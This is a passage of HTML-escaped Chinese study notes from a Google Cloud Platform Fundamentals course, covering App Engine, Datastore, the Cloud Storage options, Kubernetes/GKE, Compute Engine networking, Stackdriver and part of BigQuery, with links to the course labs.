&lt;li&gt;有類似 rolling update 的機制  &lt;ul&gt;
&lt;li&gt;Deploy 新的 version 後，GAE 會自動幫你把舊版本的 instance 關掉，然後開新的版本的 instance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以讓開發者專注在發開程式，不用費心在建置環境的部份  &lt;/li&gt;
&lt;li&gt;實例：  &lt;ul&gt;
&lt;li&gt;Snapchat  &lt;ul&gt;
&lt;li&gt;用 App Engine  &lt;/li&gt;
&lt;li&gt;只花流量的費用，不存圖片，超省成本。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;App Engine Standard Environment&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Managed runtimes for specific versions of Java, Python, PHP, Go.  &lt;ul&gt;
&lt;li&gt;目前只支援 Python 2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Autoscale  &lt;/li&gt;
&lt;li&gt;Free daily quota, usage based pricing.  &lt;/li&gt;
&lt;li&gt;原本 support 一天發 2000 封 email，但現在收回來了，現在要在 GCP 上寄信的話，統一都要使用 &lt;a href="https://sendgrid.com/"&gt;SendGrid&lt;/a&gt;，會有比較嚴格的審核，避免大量的垃圾信件。  &lt;ul&gt;
&lt;li&gt;AWS 也採用 SendGrid，蠻多 Cloud Platform 都把寄信的部份交給它。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;跟 Google 的很多服務都有滿完整的整合。  &lt;/li&gt;
&lt;li&gt;GAE 的設計理念是服務要愈 light weight 愈好  &lt;/li&gt;
&lt;li&gt;GAE 的內建服務  &lt;ul&gt;
&lt;li&gt;Memcache  &lt;ul&gt;
&lt;li&gt;免費的會有 crash 的風險，不會幫你把 data 復原。  &lt;/li&gt;
&lt;li&gt;付費的會在 crash 的時候幫你把 data 復原。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Taskqueues  &lt;ul&gt;
&lt;li&gt;用來設計保證該 task 一定會被完成的架構  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scheduled tasks  &lt;ul&gt;
&lt;li&gt;cron.yaml  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Blobstore  &lt;/li&gt;
&lt;li&gt;Search  &lt;/li&gt;
&lt;li&gt;Logging  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;App Engine Flexible Environment (GAE Managed VM)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;用 container 來處理  &lt;/li&gt;
&lt;li&gt;沒有 sandbox 的限制  &lt;/li&gt;
&lt;li&gt;可以做到支援 Python 3  &lt;/li&gt;
&lt;li&gt;During beta pricing based on GCE  &lt;/li&gt;
&lt;li&gt;Local Development relies on Docker  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GAE Standard vs Flexible Environment 比較表&lt;/h3&gt;
&lt;p&gt;&lt;img alt="GAE Environments" src="/files/cp100a-google-cloud-platform-fundamentals/gae-environments.png" /&gt;  &lt;/p&gt;
&lt;h1&gt;Google Cloud Endpoints&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Build your own API running on App Engine Standard  &lt;/li&gt;
&lt;li&gt;Expose your API using a RESTful interface  &lt;/li&gt;
&lt;li&gt;Includes support for OAuth 2.0 authorization  &lt;/li&gt;
&lt;li&gt;Generate client libraries  &lt;/li&gt;
&lt;li&gt;Supports Java and Python server-side code  &lt;/li&gt;
&lt;li&gt;Includes App Engine features  &lt;ul&gt;
&lt;li&gt;Scaling  &lt;/li&gt;
&lt;li&gt;Denial of service protection  &lt;/li&gt;
&lt;li&gt;High availability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Supports iOS, Android, and JavaScript  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;可以自動 generate client library  &lt;/li&gt;
&lt;li&gt;目前 support Java 跟 Python  &lt;/li&gt;
&lt;li&gt;直接 apply GAE 的一些 feature  &lt;/li&gt;
&lt;li&gt;HA  &lt;/li&gt;
&lt;li&gt;Support iOS, Android and JavaScript clients  &lt;/li&gt;
&lt;li&gt;但因為是在 GAE 上在堆疊一層，所以當量很大的時候，效能可能要注意一下  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Google Cloud Datastore&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Daily free quota  &lt;/li&gt;
&lt;li&gt;Database designed for application backends  &lt;/li&gt;
&lt;li&gt;NoSQL store for billions of rows  &lt;/li&gt;
&lt;li&gt;Schemaless access, no need to think about underlying data structure  &lt;/li&gt;
&lt;li&gt;Local development tools  &lt;/li&gt;
&lt;li&gt;Automatic scaling and fully managed  &lt;/li&gt;
&lt;li&gt;Built-in redundancy  &lt;/li&gt;
&lt;li&gt;Supports ACID transactions  &lt;/li&gt;
&lt;li&gt;RESTful API  &lt;/li&gt;
&lt;li&gt;Includes a free daily quota  &lt;/li&gt;
&lt;li&gt;Access from anywhere through a RESTful interface  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;有 autoscale 的能力，會對應 GAE 的數量來去調整  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 3&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-app-engine/"&gt;Deploying Applications Using App Engine and Cloud Datastore&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/GoogleCloudPlatformTraining/cp100-bookshelf"&gt;https://github.com/GoogleCloudPlatformTraining/cp100-bookshelf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 4: Google Cloud Platform Storage Options&lt;/h1&gt;
&lt;h2&gt;Google Cloud Storage&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Not a file system (but can be accessed as one via 3rd party tools such as GCS Fuse)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/GoogleCloudPlatform/gcsfuse"&gt;https://github.com/GoogleCloudPlatform/gcsfuse&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;IO 不快  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Simple administration and does not require capacity management  &lt;/li&gt;
&lt;li&gt;All storage options accessed through the same APIs and include client libraries  &lt;ul&gt;
&lt;li&gt;JSON API  &lt;/li&gt;
&lt;li&gt;XML API  &lt;ul&gt;
&lt;li&gt;可能是因為 AWS S3 是用 XML API，所以也要跟著提供一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;硬碟上的資料是有做 encryption 的  &lt;/li&gt;
&lt;li&gt;容器是以 bucket 為單位  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cloud Storage Classes&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Cloud Storage Classes" src="/files/cp100a-google-cloud-platform-fundamentals/cloud-storage-classes.png" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Standard  &lt;/li&gt;
&lt;li&gt;DRA  &lt;ul&gt;
&lt;li&gt;可以限制資料的區域  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Nearline  &lt;ul&gt;
&lt;li&gt;經常變動的資料不適合存在這裡，cost 會增加。  &lt;/li&gt;
&lt;li&gt;比較適合拿來做 backup, archive, 長久性不太會變動的資料。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這 3 個 classes 存取的 API 是相同的  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cloud Storage Features&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Cloud Storage Features" src="/files/cp100a-google-cloud-platform-fundamentals/cloud-storage-features.png" /&gt;  &lt;/p&gt;
&lt;h3&gt;Cloud Storage Integration&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery  &lt;ul&gt;
&lt;li&gt;Import and export tables  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Compute Engine  &lt;ul&gt;
&lt;li&gt;Startup scripts, images and general object storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;App Engine  &lt;ul&gt;
&lt;li&gt;Object storage, logs, Datastore backup  &lt;/li&gt;
&lt;li&gt;App Engine 本身不能存資料，但可以存在 Cloud Storage 和 Datastore  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud SQL  &lt;ul&gt;
&lt;li&gt;Import and export tables  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以拿來直接 serve static websites.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Google Cloud Bigtable&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;NoSQL database service for large-workload applications (Terabytes to Petabytes)  &lt;ul&gt;
&lt;li&gt;不便宜  &lt;ul&gt;
&lt;li&gt;貴在 Node 執行時間的收費，目前是 $1.95 USD/hour per node  &lt;/li&gt;
&lt;li&gt;最少必須開 3 個 node  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;是儲存在 SSD 上  &lt;ul&gt;
&lt;li&gt;最近開始可以選擇儲存在普通硬碟上了，Storage 的費用會降低大概十倍。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Protected  &lt;ul&gt;
&lt;li&gt;Replicated storage  &lt;/li&gt;
&lt;li&gt;Data encryption in-flight and at rest  &lt;/li&gt;
&lt;li&gt;Role-based ACLs  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Proven  &lt;ul&gt;
&lt;li&gt;Gmail and Google Analytics  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;高 IO, 可在最短的時間內查到最多的資料  &lt;/li&gt;
&lt;li&gt;Gmail 和 Google Analytics 的背後也是用 Bigtable  &lt;/li&gt;
&lt;li&gt;很多做股票交易的也是用 Bigtable  &lt;/li&gt;
&lt;li&gt;很貴但反應快  &lt;/li&gt;
&lt;li&gt;主要是為了取代 HBase  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud SQL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Google-managed MySQL  &lt;/li&gt;
&lt;li&gt;Pay-per-use model  &lt;/li&gt;
&lt;li&gt;REST API for management  &lt;/li&gt;
&lt;li&gt;Affordability and performance  &lt;ul&gt;
&lt;li&gt;有 class 可以選擇，視需求可以調整  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google security  &lt;/li&gt;
&lt;li&gt;Vertical scaling (read and write)  &lt;/li&gt;
&lt;li&gt;Horizontal scaling (read)  &lt;/li&gt;
&lt;li&gt;Seamless integratin with GAE and GCE  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;第一代的 performance 不是那麼好  &lt;/li&gt;
&lt;li&gt;第二代則是選擇 run 在 container 上  &lt;/li&gt;
&lt;li&gt;所有要連線來的 IP 都需要經過 white list  &lt;ul&gt;
&lt;li&gt;有個例外是 App Engine，可以直接連線，不會被白名單限制。  &lt;/li&gt;
&lt;li&gt;可以設定讓 Cloud SQL 綁定 GAE，讓它開在跟 GAE 同個 region，用來降低 Latency  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;七天一個 cycle 的 backup  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cloud SQL Features&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Familiar with MySQL  &lt;/li&gt;
&lt;li&gt;Flexible pricing  &lt;/li&gt;
&lt;li&gt;Google Security  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/sql/faq#encryption_manage"&gt;AES-128 encryption&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Managed backups  &lt;/li&gt;
&lt;li&gt;Automatic replication  &lt;ul&gt;
&lt;li&gt;master-slave  &lt;/li&gt;
&lt;li&gt;自動化 replication  &lt;/li&gt;
&lt;li&gt;一個 instance 掛掉的話，會有 downtime 但會再開另外一個 instance 去接替，有基本的 HA 功能。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 SSL 的 connection  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cloud SQL Second Generation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Same features as first generation with higher performance, storage capacity at lower cost.  &lt;ul&gt;
&lt;li&gt;Up to 7X throughput and 20X sotrage capacity of first generation instances  &lt;/li&gt;
&lt;li&gt;Less expensive than first generation for most use cases.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;如果想要開比較小的 DB 的話可以考慮用 2nd generation，性價比會比較高。  &lt;/li&gt;
&lt;li&gt;如果是要用很大的 DB 的話，建議用 1st generation 讓 Google 幫忙管理會比較好。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Comparing Storage Options&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Comparing Storage Options" src="/files/cp100a-google-cloud-platform-fundamentals/comparing-storage-options.png" /&gt;  &lt;/p&gt;
&lt;h2&gt;Lab 4&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-cloud-storage/"&gt;Integrating Applications with Google Cloud Storage&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 5: Google Container Engine (GKE)&lt;/h1&gt;
&lt;h2&gt;What is a Container&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Virtualization at the operating system layer  &lt;/li&gt;
&lt;li&gt;Separates operating system from application code and dependencies  &lt;/li&gt;
&lt;li&gt;Isolates individual processes  &lt;/li&gt;
&lt;li&gt;Popular implementations include Docker and &lt;a href="https://coreos.com/rkt/docs/latest/"&gt;rkt&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;k8s 目前支援這兩種格式的 Container  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OS =&amp;gt; Shared Libraries =&amp;gt; Contianer  &lt;ul&gt;
&lt;li&gt;安全性問題  &lt;ul&gt;
&lt;li&gt;會不會影響到別的 Container  &lt;/li&gt;
&lt;li&gt;把 kernel 弄爛了的話，別的 Container 也會一起爛掉。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Why Use Container?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Support consistency across development, testing, and production environments  &lt;/li&gt;
&lt;li&gt;Loose coupling between application and operating system layers  &lt;/li&gt;
&lt;li&gt;Much simpler to migrate workloads between on premises and cloud environments  &lt;/li&gt;
&lt;li&gt;Support agile development and operations  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="http://kubernetes.io/"&gt;Kubernetes (k8s)&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Open Source  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/kubernetes"&gt;https://github.com/kubernetes/kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google 的服務是跑在 &lt;a href="http://blog.kubernetes.io/2015/04/borg-predecessor-to-kubernetes.html"&gt;Borg&lt;/a&gt; 上面，Borg 是 k8s 的前身。  &lt;/li&gt;
&lt;li&gt;另外一個 Container 是 &lt;a href="https://dcos.io/"&gt;dcos&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dcos/dcos"&gt;https://github.com/dcos/dcos&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Features of k8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Workload portability  &lt;ul&gt;
&lt;li&gt;Run in many environments, across cloud providers  &lt;/li&gt;
&lt;li&gt;Implementation is open and modular  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling updates  &lt;ul&gt;
&lt;li&gt;Upgrade application with zero downtime  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Autoscaling  &lt;ul&gt;
&lt;li&gt;Automatically adapt to changes in workload  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Persistent storage  &lt;ul&gt;
&lt;li&gt;Abstracts details of how storage is provided from how it is consumed  &lt;/li&gt;
&lt;li&gt;有支援 MySQL Cluster  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multi-zone clusters  &lt;ul&gt;
&lt;li&gt;Run a single cluster in multiple zones  &lt;/li&gt;
&lt;li&gt;Alpha on Google Cloud Platform  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Load balancing  &lt;ul&gt;
&lt;li&gt;External IP address routes traffic to correct port  &lt;/li&gt;
&lt;li&gt;Google 會幫你偵測機器的狀態，在機器死掉的時候幫你做 Migration  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Container Engine (GKE)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Based on open source Kubernetes(k8s) orchestration system  &lt;/li&gt;
&lt;li&gt;Orchestrate and schedule Docker containers  &lt;/li&gt;
&lt;li&gt;Consumes Compute Engine instances and resources  &lt;/li&gt;
&lt;li&gt;Uses a declarative syntax to manage applications  &lt;ul&gt;
&lt;li&gt;JSON, YAML  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Decouple operational and development concerns  &lt;/li&gt;
&lt;li&gt;Manages and maintains  &lt;ul&gt;
&lt;li&gt;Logging  &lt;/li&gt;
&lt;li&gt;Health management  &lt;/li&gt;
&lt;li&gt;Monitoring  &lt;/li&gt;
&lt;li&gt;Scaling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;不只在 GCP 可以用，AWS 或是自己架都可以，因為是 Based on Open Source 的 k8s  &lt;/li&gt;
&lt;li&gt;可以執行很多 Container，彼此可以透過 k8s 達到 HA  &lt;/li&gt;
&lt;li&gt;目前的費用是算在 Compute Engine 上，因為實際還是開 GCE 然後在上面 run containers  &lt;/li&gt;
&lt;li&gt;目前以 GCE 的收費方式計價  &lt;/li&gt;
&lt;li&gt;Google Cloud Container Builder  &lt;ul&gt;
&lt;li&gt;Create Docker container images from app code in Google Cloud Storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google Container Registry  &lt;ul&gt;
&lt;li&gt;Secure, private Docker image storage  &lt;blockquote&gt;
&lt;p&gt;沒記錯的話 images 是存在 Cloud Storage 上  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.docker.com/"&gt;https://cloud.docker.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 5&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-container-engine/#0"&gt;Deploying Applications Using Google Container Engine&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 6: Google Compute Engine and Networking&lt;/h1&gt;
&lt;h2&gt;Google Compute Engine&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Run large-csale workloads on virtual machines hosted on Google's infrastructure  &lt;/li&gt;
&lt;li&gt;Robust networking features  &lt;ul&gt;
&lt;li&gt;可以拿來做 MySQL cluster load balancer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Instance metadata and startup scripts  &lt;ul&gt;
&lt;li&gt;每個 instance 會有 global 的 metadata 和各自的 metadata  &lt;/li&gt;
&lt;li&gt;startup script 也是放在 metadata 去做描述  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Persistent disk snapshots  &lt;/li&gt;
&lt;li&gt;High CPU, high memory, standard and shared-core machine types  &lt;/li&gt;
&lt;li&gt;HTTP and network load balancing  &lt;ul&gt;
&lt;li&gt;可以針對 Load Balancer 做個別的設定，會比 AWS 簡單。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Advanced APIs for auto-scaling and group management  &lt;/li&gt;
&lt;li&gt;Innovative pricing  &lt;ul&gt;
&lt;li&gt;per &lt;em&gt;minute&lt;/em&gt; billing, sustained use discounts  &lt;/li&gt;
&lt;li&gt;Preemptible instances  &lt;/li&gt;
&lt;li&gt;High throughput to storage at no extra cost  &lt;/li&gt;
&lt;li&gt;Custom machine types - Only pay for the hardware you need  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;Google 用 KVM 來實作這部份  &lt;/li&gt;
&lt;li&gt;可以在兩分多鐘內就開啟 1000 台機器  &lt;ul&gt;
&lt;li&gt;壓力測試跑了大概一個多小時，最後收到帳單大概是 500 美金左右。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;硬碟必須至少要 200 GB 才會有一般的 performance, &amp;lt; 200 GB 的話會比較慢。  &lt;/li&gt;
&lt;li&gt;目前看到比較多的是拿來當 Load Balancer  &lt;/li&gt;
&lt;li&gt;目前 Load Balancer 使用 BSD 是會有問題的，因為缺少某些 Linux 才有的 Libraries。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Google Cloud Networking&lt;/h2&gt;
&lt;h3&gt;Google Cloud Interconnect&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Carrier Interconnect  &lt;/li&gt;
&lt;li&gt;Direct Peering  &lt;ul&gt;
&lt;li&gt;需要有第 2 類電信執照才能申請  &lt;/li&gt;
&lt;li&gt;Connect your business directly to Google  &lt;/li&gt;
&lt;li&gt;所有流量的費用打對折，速度會更快，適合擁有 Data Center 的公司申請。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud VPN&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Secure connection over the Internet  &lt;/li&gt;
&lt;li&gt;Securely connect your network to Google Cloud Platform using IPsec VPN connection  &lt;/li&gt;
&lt;li&gt;Encrypts traffic over the Internet  &lt;/li&gt;
&lt;li&gt;Google Cloud Router supports dynamic routing between Google Cloud Platform and your network  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud DNS&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Highly available and scalable DNS  &lt;/li&gt;
&lt;li&gt;Translates domain names into IP addresses  &lt;/li&gt;
&lt;li&gt;Create managed zones, then add, edit, delete DNS records  &lt;/li&gt;
&lt;li&gt;Programmatically manage zones and records using RESTful API or command- line interface  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Load Balancing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;HTTP(s) load balancing  &lt;/li&gt;
&lt;li&gt;Balance HTTP-based traffic across multiple Compute Engine regions  &lt;/li&gt;
&lt;li&gt;Global, external IP address routes traffic  &lt;/li&gt;
&lt;li&gt;Scalable, requires no pre-warming and provides resilience, fault tolerance  &lt;/li&gt;
&lt;li&gt;TCP/SSL and UDP (network) load balancing  &lt;ul&gt;
&lt;li&gt;Spread TCP/SSL and UDP traffic over pool of instances within a Compute Engine region  &lt;/li&gt;
&lt;li&gt;Ensures only healthy instances handle traffic  &lt;/li&gt;
&lt;li&gt;Scalable, requires no pre-warming  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;Global  &lt;ul&gt;
&lt;li&gt;可以在不同的 region 建 load balancer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HTTP(S) load balancing  &lt;/li&gt;
&lt;li&gt;Network load balancing  &lt;ul&gt;
&lt;li&gt;支援 Auto scaling  &lt;/li&gt;
&lt;li&gt;可以設定 protocol 跟 port  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以選擇 client IP + Protocol 的規則，看要導到哪台 Load Balancer  &lt;/li&gt;
&lt;li&gt;有隱藏 CDN 的功能，可以把 CDN 的功能打開。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Operations and Tools&lt;/h2&gt;
&lt;h3&gt;Google Stackdriver&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Integrated monitoring, logging, diagnostics  &lt;/li&gt;
&lt;li&gt;Works across Google Cloud Platform, Amazon Web Services  &lt;/li&gt;
&lt;li&gt;Open source agents, integration  &lt;/li&gt;
&lt;li&gt;Powerful data, analytics tools  &lt;/li&gt;
&lt;li&gt;Collaborations with PagerDuty, BMC, Splunk, others  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;可以針對條件去設定 alert  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Cloud Monitoring&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;可以監控各種項目  &lt;/li&gt;
&lt;li&gt;可以自訂要監控哪些部份  &lt;/li&gt;
&lt;li&gt;可以和第三方應用程式銜接  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Cloud Logging&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;可以幫你很輕鬆的檢視不同機器的 log  &lt;/li&gt;
&lt;li&gt;Log 線上保留三十天  &lt;/li&gt;
&lt;li&gt;支援 Export，讓你可以自己處理 Log  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Deployment Manager&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Infrastructure management service  &lt;/li&gt;
&lt;li&gt;Create a .yaml template describing your environment and use Deployment Manager to create resources  &lt;/li&gt;
&lt;li&gt;Provides repeatable deployments  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;有點類似 Ansible 和 Chef  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Source Repositories&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Fully-featured Git repositories hosted on Google Cloud Platform  &lt;/li&gt;
&lt;li&gt;Supports collaborative development of cloud apps  &lt;/li&gt;
&lt;li&gt;Includes:  &lt;ul&gt;
&lt;li&gt;Source code editor  &lt;/li&gt;
&lt;li&gt;Integration with Stackdriver debugger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Functions&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Create single-purpose functions that respond to events without a server or runtime  &lt;ul&gt;
&lt;li&gt;Event examples: New instance created, file added to Cloud Storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Written in Javascript, execute in managed Node.js environment on Google Cloud Platform  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 6&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-compute-engine/#0"&gt;Deploying Applications Using Google Compute Engine&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 7: Big Data and Machine Learning&lt;/h1&gt;
&lt;p&gt;&lt;img alt="Big Data Services" src="/files/cp100a-google-cloud-platform-fundamentals/big-data-services.png" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fully managed, No-Ops Services  &lt;/li&gt;
&lt;li&gt;BigQuery  &lt;ul&gt;
&lt;li&gt;一個 column 就儲存一個 object，不是存 row。(column based)  &lt;ul&gt;
&lt;li&gt;不要下 &lt;code&gt;select *&lt;/code&gt;，會很慢，而且很貴，因為會對 process 的資料量收費。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;每次 query 就透過 mapreduce 去做 macthing  &lt;/li&gt;
&lt;li&gt;可以透過 SQL-like 的語法(GQL)去查詢 big data  &lt;/li&gt;
